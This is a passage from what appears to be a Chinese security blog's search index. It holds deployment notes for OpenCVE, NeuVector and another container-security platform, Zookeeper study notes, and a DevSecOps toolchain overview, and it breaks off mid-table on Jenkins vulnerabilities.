Owner  | Encoding |  Collate   |   Ctype    |  Access privileges\n-----------+---------+----------+------------+------------+---------------------\n opencve   | opencve | UTF8     | en_US.utf8 | en_US.utf8 |\n postgres  | opencve | UTF8     | en_US.utf8 | en_US.utf8 |\n template0 | opencve | UTF8     | en_US.utf8 | en_US.utf8 | &#x3D;c&#x2F;opencve         +\n           |         |          |            |            | opencve&#x3D;CTc&#x2F;opencve\n template1 | opencve | UTF8     | en_US.utf8 | en_US.utf8 | &#x3D;c&#x2F;opencve         +\n           |         |          |            |            | opencve&#x3D;CTc&#x2F;opencve\n(4 rows)\n# 查看数据库中的表\nopencve-# \\d\n             List of relations\n Schema |      Name       | Type  |  Owner\n--------+-----------------+-------+---------\n public | alembic_version | table | opencve\n public | alerts          | table | opencve\n public | alerts_events   | table | opencve\n public | changes         | table | opencve\n public | cves            | table | opencve\n public | cves_tags       | table | opencve\n public | cwes            | table | opencve\n public | events          | table | opencve\n public | metas           | table | opencve\n public | products        | table | opencve\n public | reports         | table | opencve\n public | tasks           | table | opencve\n public | users           | table | opencve\n public | users_products  | table | opencve\n public | users_tags      | table | opencve\n public | users_vendors   | table | opencve\n public | vendors         | table | opencve\n(17 rows)\nCreate an admindocker exec -it webserver opencve create-user admin admin@happycfc.com --admin\nPassword:\nRepeat for confirmation:\n[*] User john created.&#96; \n\n\nStart the beatdocker-compose up -d celery_beat\n\nAPI使用其REST API与OpenCVE交互。详见API文档Introduction - OpenCVE Documentation请求示例：\nGET &#x2F;api&#x2F;cve HTTP&#x2F;1.1 Host: example.com Accept: application&#x2F;json\n\n","slug":"搭建漏洞库-OpenCVE","date":"2022-04-08T07:56:44.000Z","categories_index":"软件供应链安全","tags_index":"开源漏洞库,部署手册,OpenCVE","author_index":"Moses"},{"id":"56dbee3ed1ebfa2e56e8dd9905790f13","title":"容器安全平台-NeuVector","content":"开源云原生产品现状\n\n\n项目\n厂商\n链接\nStar\n类型\n开源时间\n\n\n\nclair\nQuay\nhttps://github.com/quay/clair\n8.4k\n镜像扫描\n2015-11-13\n\n\ntrivy\nAqua\nhttps://github.com/aquasecurity/trivy\n10.1k\n镜像扫描\n2019-04-11\n\n\nkube-hunter\nAqua\nhttps://github.com/aquasecurity/kube-hunter/\n3.4k\n漏洞扫描\n2018-07-18\n\n\nkube-bench\nAqua\nhttps://github.com/aquasecurity/kube-bench\n4.5k\nCIS 安全基线\n2017-06-19\n\n\nstarboard\nAqua\nhttps://github.com/aquasecurity/starboard\n968\nDashboard\n2020-03-17\n\n\ntracee\nAqua\nhttps://github.com/aquasecurity/tracee\n1.5k\n基于 eBPF 的系统事件追踪\n2019-09-18\n\n\nanchore-engine\nanchore\nhttps://github.com/anchore/anchore-engine\n1.4k\n漏洞扫描\n2017-09-06\n\n\nkyverno\nkyverno.io\nhttps://github.com/kyverno/kyverno\n1.8k\nKubernetes 策略与审计\n2019-02-04\n\n\nGateKeeper\nOPA (sysdig)\nhttps://github.com/open-policy-agent/gatekeeper\n1.3k\nKubernetes 策略与审计\n2018-10-26\n\n\nfalco\nfalcosecurity(sysdig)\nhttps://github.com/falcosecurity/falco\n4.4k\n基于内核模块的系统事件追踪、警告\n2016-01-19\n\n\nterrascan\naccurics.com\nhttps://github.com/accurics/terrascan\n2.7k\n通用的 IaS 配置扫描\n2017-09-11\n\n\nKubei\nportshift\nhttps://github.com/cisco-open/kubei\n489\n镜像扫描(带面板)\n2020-03-22\n\n\nPolaris\nFairwinds\nhttps://github.com/FairwindsOps/polaris\n2.4k\n配置扫描与策略\n2018-11-15\n\n\nkubesec\ncontrolplaneio\nhttps://github.com/controlplaneio/kubesec\n667\nKubernetes 配置扫描\n2017-10-10\n\n\nKubeEye\nKubeSphere\nhttps://github.com/kubesphere/kubeeye\n424\n基于策略的 Kubernetes 集群配置扫描\n2020-11-07\n\n\nkube-linter\nStackrox(RedHat)\nhttps://github.com/stackrox/kube-linter\n1.8k\nKubernetes 配置扫描\n2020-08-13\n\n\nNeuVector架构\n\nManager, NeuVector 的 Web 控制台，为用户提供了统一的管理 UI，便于用户查看安全事件、管理安全解决方案、规则等。\nController, Backend 服务器及控制器，管理如 Enforcer、Scanner 等其他组件，分发安全策略及调度扫描任务。\nScanner, 用户执行漏洞扫描、基线扫描等任务。\nEnforcer, 一个轻量级的容器，用于拦截系统事件，执行安全策略等。通常以 Daemon set 运行再集群中的每个节点上。\nUpdater， 用于更新 CVE 数据库。\n\n主要功能\n安全漏洞扫描\n\n容器网络流量可视化\n\n网络安全策略定义\n\nL7 防火墙\n\nCICD 安全扫描\n\n合规分析\n\n\n安装使用 helm 安装 NeuVector\n创建 namespace\n\nkubectl create namespace neuvector \n\n创建 serviceaccount\n\nkubectl create serviceaccount neuvector -n neuvector \n\n添加 neuvector 的 helm 仓库\n\nhelm repo add neuvector https://neuvector.github.io/neuvector-helm/ \n\n安装 neuvector\n\nhelm install my-neuvector --namespace neuvector neuvector/core \n\n\n替换镜像\n\n\n\n\n\n\n\n\n\n由于 neuvector 镜像需要权限才能获取，这里将镜像替换为 preview 版本 更多安装信息请参考：https://github.com/neuvector/neuvector-helm/tree/master/charts/core\n\n\nkubectl set image deployment.apps&#x2F;neuvector-controller-pod *&#x3D;neuvector&#x2F;controller.preview:5.0.0-preview.1 -n neuvector\nkubectl set image deployment.apps&#x2F;neuvector-manager-pod *&#x3D;neuvector&#x2F;manager.preview:5.0.0-preview.1 -n neuvector\nkubectl set image deployment.apps&#x2F;neuvector-scanner-pod *&#x3D;neuvector&#x2F;scanner.preview:latest -n neuvector\nkubectl set image daemonset.apps&#x2F;neuvector-enforcer-pod *&#x3D;neuvector&#x2F;enforcer.preview:5.0.0-preview.1 -n neuvector\nkubectl get cronjob&#x2F;neuvector-updater-pod -n neuvector -o yaml | sed &#39;s#image: registry.neuvector.com&#x2F;updater:latest#image: neuvector&#x2F;updater.preview:latest#&#39; | kubectl replace -f -&#96; \n\nHelm-chart 参数查看\nquick start\n创建 namespacekubectl create namespace neuvector\n部署 CRD( Kubernetes 1.19+ 版本)kubectl apply -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;neuvector&#x2F;manifests&#x2F;main&#x2F;kubernetes&#x2F;crd-k8s-1.19.yaml\n部署 CRD(Kubernetes 1.18或更低版本)kubectl apply -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;neuvector&#x2F;manifests&#x2F;main&#x2F;kubernetes&#x2F;crd-k8s-1.16.yaml\n配置 RBACkubectl create clusterrole neuvector-binding-app --verb&#x3D;get,list,watch,update --resource&#x3D;nodes,pods,services,namespaces\nkubectl create clusterrole neuvector-binding-rbac --verb&#x3D;get,list,watch --resource&#x3D;rolebindings.rbac.authorization.k8s.io,roles.rbac.authorization.k8s.io,clusterrolebindings.rbac.authorization.k8s.io,clusterroles.rbac.authorization.k8s.io\nkubectl create clusterrolebinding neuvector-binding-app --clusterrole&#x3D;neuvector-binding-app --serviceaccount&#x3D;neuvector:default\nkubectl create clusterrolebinding neuvector-binding-rbac --clusterrole&#x3D;neuvector-binding-rbac --serviceaccount&#x3D;neuvector:default\nkubectl create clusterrole neuvector-binding-admission --verb&#x3D;get,list,watch,create,update,delete --resource&#x3D;validatingwebhookconfigurations,mutatingwebhookconfigurations\nkubectl create clusterrolebinding neuvector-binding-admission --clusterrole&#x3D;neuvector-binding-admission --serviceaccount&#x3D;neuvector:default\nkubectl create clusterrole neuvector-binding-customresourcedefinition --verb&#x3D;watch,create,get --resource&#x3D;customresourcedefinitions\nkubectl create clusterrolebinding  neuvector-binding-customresourcedefinition --clusterrole&#x3D;neuvector-binding-customresourcedefinition --serviceaccount&#x3D;neuvector:default\nkubectl create clusterrole neuvector-binding-nvsecurityrules --verb&#x3D;list,delete --resource&#x3D;nvsecurityrules,nvclustersecurityrules\nkubectl create clusterrolebinding neuvector-binding-nvsecurityrules --clusterrole&#x3D;neuvector-binding-nvsecurityrules --serviceaccount&#x3D;neuvector:default\nkubectl create clusterrolebinding neuvector-binding-view --clusterrole&#x3D;view --serviceaccount&#x3D;neuvector:default\nkubectl create rolebinding neuvector-admin --clusterrole&#x3D;admin --serviceaccount&#x3D;neuvector:default -n neuvector\n检查是否有以下 RBAC 对象kubectl get clusterrolebinding  | grep neuvector\nkubectl get rolebinding -n neuvector | grep neuvector\n\nkubectl get clusterrolebinding  | grep neuvector\n\nneuvector-binding-admission                            ClusterRole&#x2F;neuvector-binding-admission                            44h\nneuvector-binding-app                                  ClusterRole&#x2F;neuvector-binding-app                                  44h\nneuvector-binding-customresourcedefinition             ClusterRole&#x2F;neuvector-binding-customresourcedefinition             44h\nneuvector-binding-nvadmissioncontrolsecurityrules      ClusterRole&#x2F;neuvector-binding-nvadmissioncontrolsecurityrules      44h\nneuvector-binding-nvsecurityrules                      ClusterRole&#x2F;neuvector-binding-nvsecurityrules                      44h\nneuvector-binding-nvwafsecurityrules                   ClusterRole&#x2F;neuvector-binding-nvwafsecurityrules                   44h\nneuvector-binding-rbac                                 ClusterRole&#x2F;neuvector-binding-rbac                                 44h\nneuvector-binding-view                                 ClusterRole&#x2F;view                                                   44h\n\nkubectl get rolebinding -n neuvector | grep neuvector\nneuvector-admin         ClusterRole&#x2F;admin            44h\nneuvector-binding-psp   Role&#x2F;neuvector-binding-psp   44h\n部署 NeuVector底层 Runtime 为 Dockerkubectl apply -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;neuvector&#x2F;manifests&#x2F;main&#x2F;kubernetes&#x2F;5.0.0&#x2F;neuvector-docker-k8s.yaml\n底层 Runtime 为 Containerd（对于 k3s 和 rke2 可以使用此 yaml 文件）kubectl apply -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;neuvector&#x2F;manifests&#x2F;main&#x2F;kubernetes&#x2F;5.0.0&#x2F;neuvector-containerd-k8s.yaml\n\n1.21 以下的 Kubernetes 版本会提示以下错误，将 yaml 文件下载将 batch&#x2F;v1 修改为 batch&#x2F;v1beta1\nerror: unable to recognize &quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;neuvector&#x2F;manifests&#x2F;main&#x2F;kubernetes&#x2F;5.0.0&#x2F;neuvector-docker-k8s.yaml&quot;: no matches for kind &quot;CronJob&quot; in version &quot;batch&#x2F;v1&quot;\n1.20.x cronjob 还处于 beta 阶段，1.21 版本开始 cronjob 才正式 GA 。\n默认部署web-ui使用的是loadblance类型的Service，为了方便访问修改为NodePort，也可以通过 Ingress 对外提供服务\nkubectl patch svc neuvector-service-webui -n neuvector --type&#x3D;&#39;json&#39; -p &#39;[&#123;&quot;op&quot;:&quot;replace&quot;,&quot;path&quot;:&quot;&#x2F;spec&#x2F;type&quot;,&quot;value&quot;:&quot;NodePort&quot;&#125;,&#123;&quot;op&quot;:&quot;add&quot;,&quot;path&quot;:&quot;&#x2F;spec&#x2F;ports&#x2F;0&#x2F;nodePort&quot;,&quot;value&quot;:30888&#125;]&#39;\n高可用架构设计NeuVector-HA 主要需要考虑 Controller 模块的 HA，只要有一个 Controller 处于打开状态，所有数据都将在 3 个副本之间之间同步。\nController 数据主要存储在 &#x2F;var&#x2F;neuvector&#x2F; 目录中，但出现 POD 重建或集群重新部署时，会自动从此目录加载备份文件，进行集群恢复。\n部署策略NeuVector 官方提供四种 HA 部署模式\n\n方式一：不进行任何调度限制，由 Kubernetes 进行自由调度管理管理。\n方式二：NeuVector control 组件 (manager,controller）+enforce、scanner组件配置调度 label 限制和污点容忍，与 Kubernetes master 节点部署一起。\n方式三：给 Kubernetes 集群中通过 Taint 方式建立专属的 NeuVector 节点，只允许 Neuvector control 组件部署。\n方式四：NeuVector control 组件 (manager,controller）配置调度 label 限制和污点容忍，与 Kubernetes master 节点部署一起。k8s-master 不部署 enforce 和 scanner 组件，意味着 master 节点不在接受扫描和策略下发。\n\n方式二部署样例\n给 master 节点打上特定标签kubectl label nodes nodename nvcontroller=true\n获取节点 Taintkubectl get node nodename -o yaml|grep -A 5 taint\n以 Rancher 部署的节点 master 节点为例taints:\n  - effect: NoSchedule\n    key: node-role.kubernetes.io&#x2F;controlplane\n    value: &quot;true&quot;\n  - effect: NoExecute\n    key: node-role.kubernetes.io&#x2F;etcd\n编辑部署的 yaml 给 NeuVector-control 组件（manager,controller）添加 nodeSelector 和 tolerations 给 enforce、scanner 组件只添加 tolerations 。例如编辑manager组件：kind: Deployment\nmetadata:\n  name: neuvector-manager-pod\n  namespace: neuvector\nspec:\n  selector:\n    matchLabels:\n      app: neuvector-manager-pod\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: neuvector-manager-pod\n    spec:\n      nodeSelector:\n        nvcontroller: &quot;true&quot;\n      containers:\n        - name: neuvector-manager-pod\n          image: neuvector&#x2F;manager.preview:5.0.0-preview.1\n          env:\n            - name: CTRL_SERVER_IP\n              value: neuvector-svc-controller.neuvector\n      restartPolicy: Always\n      tolerations:\n      - effect: NoSchedule\n        key: &quot;node-role.kubernetes.io&#x2F;controlplane&quot;\n        operator: Equal\n        value: &quot;true&quot;\n      - effect: NoExecute\n        operator: &quot;Equal&quot;\n        key: &quot;node-role.kubernetes.io&#x2F;etcd&quot;\n        value: &quot;true&quot;\n\n数据持久化方案\n配置环境变量启用配置数据持久化- env:\n  - name: CTRL_PERSIST_CONFIG\n配置此环境变量后，默认情况下 NeuVector-Controller 会将数据存储在 &#x2F;var&#x2F;neuvector 目录内，默认此目录是 hostpath 映射在 POD 所在宿主机的 &#x2F;var&#x2F;neuvector 目录内。\n\n若需要更高级别数据可靠性也可以通过 PV 对接 nfs 或其他支出多读写的存储中。\n这样当出现 NeuVector-Controller 三个 POD 副本同时都销毁，宿主机都完全不可恢复时，也不会有数据配置数据丢失。以下以 NFS 为例，部署NFS创建PV和PVC。\ncat &lt;&lt;EOF | kubectl apply -f -\n\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name: neuvector-data\nspec:\n  capacity:\n    storage: 10Gi\n  accessModes:\n    - ReadWriteMany \n  nfs:\n    path: &#x2F;nfsdata\n    server: 172.16.0.195 \n\nEOF\ncat &lt;&lt;EOF | kubectl apply -f -\n\nkind: PersistentVolumeClaim\napiVersion: v1\nmetadata:\n  name: neuvector-data\n  namespace: neuvector\nspec:\n  accessModes:\n    - ReadWriteMany\n  resources:\n    requests:\n      storage: 10Gi\nEOF\n修改 NeuVector-Controller 部署 yaml，添加 pvc 信息，将 &#x2F;var&#x2F;neuvector 目录映射到 nfs 中（默认是hostpath映射到本地)\nspec:\n  template:\n    spec:\n      volumes:\n        - name: nv-share\n#         hostPath:                        &#x2F;&#x2F; replaced by persistentVolumeClaim\n#           path: &#x2F;var&#x2F;neuvector        &#x2F;&#x2F; replaced by persistentVolumeClaim\n          persistentVolumeClaim:\n            claimName: neuvector-data\n或直接在 NeuVector 部署 yaml 中挂载 nfs 目录\nvolumes:\n      - name: nv-share\n        nfs:\n          path: &#x2F;opt&#x2F;nfs-deployment\n          server: 172.26.204.144\n多云安全管理在实际生产应用中，会存在对多个集群进行安全进行管理，NeuVector 支持集群联邦功能。\n需要在一个集群上暴露 Federation Master 服务，在每个远端集群上部署 Federation Worker 服务。为了更好的灵活性，可以在每个集群同时启用 Federation Master 和 Federation Worker 服务。\n在每个集群部署此 yaml\napiVersion: v1\nkind: Service\nmetadata:\n  name: neuvector-service-controller-fed-master\n  namespace: neuvector\nspec:\n  ports:\n  - port: 11443\n    name: fed\n    nodePort: 30627\n    protocol: TCP\n  type: NodePort\n  selector:\n    app: neuvector-controller-pod\n\n---\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: neuvector-service-controller-fed-worker\n  namespace: neuvector\nspec:\n  ports:\n  - port: 10443\n    name: fed\n    nodePort: 31783\n    protocol: TCP\n  type: NodePort\n  selector:\n    app: neuvector-controller-pod\n\n\n\n云原生安全平台 NeuVector 部署快速上手云原生安全平台 NeuVector实用教程 | 云原生安全平台 NeuVector 部署云原生安全产品 NeuVector 简介\n","slug":"容器安全平台-NeuVector","date":"2022-03-04T09:47:49.000Z","categories_index":"Cloud-Native-Security","tags_index":"云原生安全,NeuVector,容器安全平台,suse,产品选型","author_index":"Moses"},{"id":"af03dd5b5c07726870f53848ba50413b","title":"容器安全平台-小佑科技","content":"install\n修改k8s-dosec-web.yaml和k8s-dosec-configMap.yamlenv:\n  - name:Web_API_ADDR\n  value: &#39;http:&#x2F;&#x2F;masterip:30089&#39;\n  #configmap\n  #注释掉WEB_API:修改下面参数\n  WEB_DOMAIN_NAME: &#39;http:&#x2F;&#x2F;nasterip:30998&#39;\n2.依次应用配置。也可以尝试使用mainfest方式kubectl applf -f k8s-dosec-rbca.yaml\nkubectl applf -f k8s-dosec-sercet.yaml\nkubectl applf -f k8s-dosec-configMap.yaml\nkubectl applf -f k8s-dosec-db.yaml\nkubectl applf -f k8s-dosec-web.yaml\nkubectl applf -f k8s-dosec-server.yaml\nkubectl applf -f k8s-dosec-agent.yaml\n3.登录server初始账号root密码qweASD1234.使用测试license\n\n技术指标量化测试\n","slug":"容器安全平台-小佑科技","date":"2022-03-04T09:35:44.000Z","categories_index":"Cloud-Native-Security","tags_index":"云原生安全,容器安全平台,产品选型,小佑科技","author_index":"Moses"},{"id":"618a44db788d8cdf326efbd9f5f8d4cf","title":"分布式系统学习-Zookeeper","content":"Zookeeper在 [[CAP]]中选择了C和P，在Leader故障，选举新的Leader期间，zookeeper集群不对外提供服务。\n特点\n分布式协调\n可靠性\n有集群不可用的时候，即leader下线，follower在选举的期间，集群不可用。 一致性\n最终一致性\n一致性协议 [[ZAB]]\n\n\n时序\n\n扩展架构角色\nleader\n支持写，支持读\n\n\nfollower\n支持读，参与选举\n10个人选举和10亿人选举，自然是10人选举的速度快，所以follower的数量保证选举即可，无需过多的数量。\n\n\nobserver  支持读，扩展查询的性能。\n\n角色在zk配置文件中的体现 zoo.cfgserver.1&#x3D;node-001:2888:3888\nserver.2&#x3D;node-001:2888:3888\nerver.3&#x3D;node-001:2888:3888\nserver.4&#x3D;node-001:2888:3888:observer\nserver.5&#x3D;node-001:2888:3888:observer\nserver.6&#x3D;node-001:2888:3888:observer\nserver.7&#x3D;node-001:2888:3888:observer\n快速\n正常情况下的读写速度快\n当leader掉线，选举新的leader速度快，集群恢复速度快。\n\n数据存储\n在内存中存数据的状态。状态数据必定是在日志数据写入成功之后，才有可能生成。\n在磁盘中写日志。当然，日志也是先写到内存，再到磁盘，内存中的状态数据和日志数据是两类数据。\n\nServerClient\nwatch\nnew zk 时传入的watch\n是session级别，跟path，node没有关系。\nsession状态发生变化，会被重复触发。\n当与连接的服务器中断连接，自动重连后，sessionId不发生变化。\n\n\n普通的watch\n一次性，不会重复被触发，要想重复触发，每次触发后，要再watch。\n\n\n\n\n\n响应式编程与常规编程的主要差异：工程师由业务执行逻辑顺序的规划者，编程业务内容的规划者，执行顺序交给计算机来调度。\n应用场景\n分布式配置，服务注册发现\n分布式锁\n分布式协调\n\n","slug":"ZooKeeper","date":"2022-02-15T00:57:00.000Z","categories_index":"分布式","tags_index":"分布式系统,分布式理论,CAP,Zookeeper","author_index":"Moses"},{"id":"1a872c8e58dbc5f12955fd570dcb5da9","title":"DevSecOps工具链","content":"DevSecOps实践Gartner在2019年的一篇文章中给出了一个经过调研和分析的比较全面的实践清单。如图它由一些列关键路径和持续步骤中的措施和机制组成，周而复始第运转。它的关注点主要是在研发过程中的安全漏洞及其引发的各类风险的管控。\n\n忘记了😄\n某证券公司DevSecOps落地实践\n悬镜安全开发工具链\n默安科技DevSecOps工具链\n携程DevSecOps实践\n开源网安\n\n1.plan（需求和涉及）\n偿还安全债务：类似系统研发过程中的技术债务，DevSecOps也会出现安全债务。需要认识到风险并且制定计划逐步偿还，否则早晚有一天会造成严重的安全事故。\n度量与指标：推荐DevSecOps需要良好的度量方式，正确地选择指标和合理地使用度量，可以帮助团队得到持续改进的成果。缺陷密度、楼栋数、风险问题[[DevSecOps度量#DevSecOps度量指标]]\n轻量有效的威胁建模：除了传统意义上威胁建模方法论和工具以外，快速的安全自查清单、安全知识库等都是一些有益的探索。目的都是将需求和设计的安全评估推上持续构建的快车道。\n安全流程和安全工具的使用培训：DevSecOps工具可以帮助团队发现问题，但最终解决安全问题的还是人。可根据现有开发流程中构建安全需求&amp;设计&amp;评审流程\n供应商评估：开源产品引入评估、软件供应商评估\n安全编码规范&amp;培训\n\n2.Create（编码&#x2F;编译）\nIDE插件：即各类安全漏洞扫描、开源组件版本甚至是代码质量、代码风格检查等工具，可以让研发人员在编码时发现和消除一些潜在的安全风险。如 [[代码审计-OWASP project-find-sec-bugs|OWASP项目之find-sec-bugs]] [[使用snyk检查开源软件依赖中的漏洞.md]]、阿里Java检测插件、sonar插件、陌陌安全插件、Dependency-Check等\n标准化加固：基线安全CIS Benchmark\n\n3.Verify（测试&#x2F;验证）\n静态应用安全测试（Static Application Security Test，SAST）：指针对源代码进行静态分析，从中找到安全漏洞的测试方式，有些工具也会依赖于编译过程甚至是二进制文件，通过一些抽象语法树、控制流及污点追踪等技术手段来提升检测覆盖度和准确度，也称白盒测试。[[SAST方案调研]]\n动态应用安全测试（Dynamic Application Security Test，DAST）：指在测试或运行阶段分析应用程序的动态运行状态。在不需要系统源码的情况下，通过模拟黑客行为给应用程序构造特定的输入，分析应用程序的行为和反应，从而确定该应用是否存在某些类型的安全漏洞，也称黑盒测试。\n交互式应用安全测试（Interactive Application Security Test，IAST）：指寻求将外部动态和内部静态分析技术结合起来。常见的IAST有代理和插桩两种模式。代理模式是在PC端浏览器或者移动端App设置代理，通过代理拿到功能测试的流量，利用功能测试流量模拟多种漏洞的检测方式。插桩模式（分为主动和被动插桩）是在保证目标程序原有逻辑完整的情况下，在特定的位置插入探针，在应用程序运行时，同探针获取请求、代码、数据流和控制流等，基于此综合分析和判断漏洞。也称灰盒测试.\n软件成分分析（Software Composition Analysis，SCA）：针对第三方开源代码组件&#x2F;库的低版本漏洞检测工具也被集中到IDE安全插件中，编码的时候引入就会有安全提示，甚至修正引入库的版本来修复漏洞。\n\nSAST、DAST和IAST的对比\n\n\n\n对比项\nSAST\nDAST\nIAST\n\n\n\n测试对象\n源代码\n运行时的应用程序\n运行时的应用程序\n\n\n测试准备\n简单\n负责\n负责\n\n\n测试方法\n白盒\n黑盒\n灰盒\n\n\n部署成本\n低\n低\n低\n\n\n误报率\n高\n低\n极低\n\n\n使用成本\n高，人工排除误报\n较低，基本无线人工验证\n低，基本没有误报\n\n\n漏洞检出率\n高\n中\n低\n\n\n侵入性\n低\n高\n低\n\n\n脏数据\n较少\n非常多\n几乎没有\n\n\n集成阶段\n研发阶段\n测试&#x2F;线上运营阶段\n测试阶段\n\n\n测试覆盖率\n高\n低\n高\n\n\n检测速度\n随代码量呈指数增长\n随测试用例数量稳定增长\n实时检测\n\n\n逻辑漏洞检测\n不支持\n部分支持\n部分支持\n\n\n影响漏洞检出率因素\n与规则有关，企业可定制规则\n与测试playload覆盖度有关\n与检测方式有关，企业可定制测量方式\n\n\n第三方组件漏洞检测\n不支持\n支持\n支持\n\n\n支持语言\n区分语言\n不区分语言\n区分语言\n\n\n支持框架\n区分框架\n不区分框架\n区分框架\n\n\n风险程度\n低\n较高\n低\n\n\n漏洞详情\n较高、数据流+代码行数\n中，请求\n高，请求+数据流+代码行数\n\n\nCI&#x2F;CD集成\n支持\n不支持\n支持\n\n\n4.Preprod（预发布）\n混动工程（Chaos Engineering):Security Monkey\nFuzzing：模糊测试OWASP Mantra\n集成测试：方法类似SAST、DAST、IAST等。\n\n5.Prevent（预防）\n完整性检测：完整性检查器可以检测任何关键的系统文件是否已被更改，从而是系统管理员可以查找未经授权的系统更改；也可以检查存储的文件或网络数据包，以确定他们是否已被更改。\n纵深防御措施：即Defence-in-Depth(DiD)\n攻击面管理：即(Attack Surface Management ,ASM)\n\n6.Detect(检测)\nRASP：[[RASP技术简介]]它的底层技术实现可能与某些IAST类似，但是该方案带来巨大收益的同时也因为修改了运行时环境的底层，可能对应用的性能、兼容性和稳定性造成或多或少的影响，在评估和实现方案时需要重点考虑和应对。\nUEBA&#x2F;网络监控：\n渗透测试：\n\n7.Respond(响应)\n安全编排：（Security Orchestration，SO):定义安全事件分析与自动化响应工作流程。采集各自运营团队关心的安全检测系统数据，对它们进行分析与分类，利用最资深安全分析人员的专家经验，自动化定义、排序和驱动按标准工作流程执行的安全事件响应活动。安全编排又详细定义为安全编排与自动化、安全事件响应平台和威胁情报平台三种技术&#x2F;工具的融合。\nWAF：除了应对传统的web漏洞攻击、CC攻击以外，WAF也逐渐发掘提出了反爬虫、打击羊毛党等场景，将安全能力从漏洞防护扩展到业务安全领域。\n威胁情报平台：即（Threat intelligence Platform，TIP）。提供本地化、全方位的威胁情报能力，包括及时发现关键威胁、对已有报警进行五宝筛除或分级、为事件影响提供决策需要的上下文、提供安全预警能力、提供自有情报运营能力等。\n协同事件响应平台：Collaborative Incident Response platform，自动化响应(Auto Response,AR)[[事件响应-协同事件响应平台-iris-web]]\n\n8.Predict（预测）\n漏洞相关分析：属于软件漏洞管理（Application Vulnerability Correlation，AVC）。漏洞的发现肯定无法依靠单一的一种工具和方式，而是会由上下文的SAST、DAST、IAST、RASP以及人工渗透测试等各种各样的手段和工具来完成。但这也会产生新的问题，比如这些方式和工具存在重复扫描、难以协同等问题。在这种情况下，就催生出AVC方案。理想中的AVC可以管理所有安全工具，通过标注化数据格式等方式使它们之间更高效地写作，依次更高效地发现和管理所有的环节的漏洞。\n威胁情报：（Threat intelligence，TI）是基于证据的知识，包括场景、机制、标示、含义和可操作的建议。这些知识时关于现存的或者是即将出现的针对资产的威胁或危险的，可为响应相关威胁或威胁提供决策信息。其中关键信息就是失陷标示（Indicators of Compromise，IoC），如攻击行动所使用的木马名称、文件指纹、进程信息、恶意域名、C&amp;C服务器IP等。\n\nCI&#x2F;CD pipeline\nDevSecOps工具链整理技术和工具是实现DevSecOps的基础。利用工具的最终目的是通过在SDLC各个阶段形成工具链，减少手动操作，实现流程管理和自动化的落地，最终提高交付速度、质量和安全。在推动DevSecOps需要考虑的流程、工具和文化中，一般都是工具先行。\n\n\n\n\n开源工具\n商用工具\n\n\n\n项目和任务管理工具\nTrello、tasktop、CollabNet VersionOne、Pivotal Tracker\nJira\n\n\n源代码管理工具\nGitlab、subversion\nGithub、Gitlab、Bitbucket\n\n\n持续集成工具\nJenkins、TeamCity Professional、CircleCI\nCloudBee、TeamCity Enterprise、Bamboo\n\n\n构建工具\nMaven、Gradle、MSBuild\n\n\n\n静态代码分析工具\nSonarQube、FindBug、FxCop、PMD、Checkstyle、Pylint CppCheck、StylrCop\nSonarQube Enterprise、Coverity、Klocwork\n\n\n单元测试框架\nJunit、Nunit、Unittest、CppUnit\n\n\n\n自动化测试工具\nSelenium、JMeter、Cucumber、Postman\nHP QTP、Quality Center\n\n\n制品管理工具\nNexus OSS、Artifactory OSS\nNexus Pro 、Artifactory Enterprise\n\n\n自动化配置工具\nTerraform、Ansible、Chef、Puppet\nAnsible Tower、Chef Enterprise、puppet Enterprise\n\n\n自动化发布工具\nAnsible、Chef、Puppet\nNolio、Ansible Tower、Chef Enterprise、puppet Enterprise\n\n\n监控工具\nPrometheus、Skywalking、Zabbix、Grafana\nGeneos\n\n\n日志分析工具\nELK\nSplunk、ELK Enterprise\n\n\n配置管理工具\nCMDB\nEasyOps\n\n\n静态安全测试工具\nSonarQube、NodeJsScan\nCheckMarx、Fortify、Appscan\n\n\n动态安全检测工具\nOWASP ZAP\nAWVS、APPScan、Webinpsect\n\n\n交互安全测试工具\nContrast Security-Community\nContrast Security\n\n\n第三方安全扫描工具\nDependency-Check\nSonatype IQ Server\n\n\n威胁建模工具\nOWASP Threat Dragon、微软官方威胁建模工具\nIrisRisk\n\n\n\n在软件供应链中每个阶段都在面临不同的安全风险，为了更好的对软件供应链进行风险治理，在 DevSecOps 模式 下，安全开发工具链需要尽量覆盖软件生命周期中的所有阶段\nDevSecOps 敏捷安全技术金字塔DevSecOps 敏捷安全技术金字塔在《2020 DevSecOps 行业洞察报告》中首次被提出， 目前已发展到 2.0 版本。其描述了一组层次结构，金字塔底部是基础性技术，越上层的技术对 DevSecOps 实践成 熟度的要求越高。DevSecOps 敏捷安全技术金字塔的不断升级，是为了给业界更好的预测和参考，关于 DevSecOps 敏捷安全技术 未来演进方向的预测是开放且持续性的，随着 DevSecOps 实践的不断发展，其中的安全工具会进行调整和更新。\nDevSecOps工具链的潜在风险\n\n\n工具名称\n暴露资产数\n\n\n\nJenkins\n16226\n\n\nGitLab\n9035\n\n\nGithub\n538\n\n\nChef\n12\n\n\nDatadog\n11\n\n\nSpinnaker\n8\n\n\nTerraform\n4\n\n\nOctopus Deploy\n2\n\n\nJenkinsJenkins是一个独立的开源自动化服务器，是一款提供友好操作界面的持续集成(CI)的工具，可用于自动化各种任务，如构建，测试和部署软件等。Jenkins相关漏洞缓解措施参考[官网](Fetching Title#nij6插件Handling Vulnerabilities in Plugins\n\n\n\nCVE  ID\nCVSS 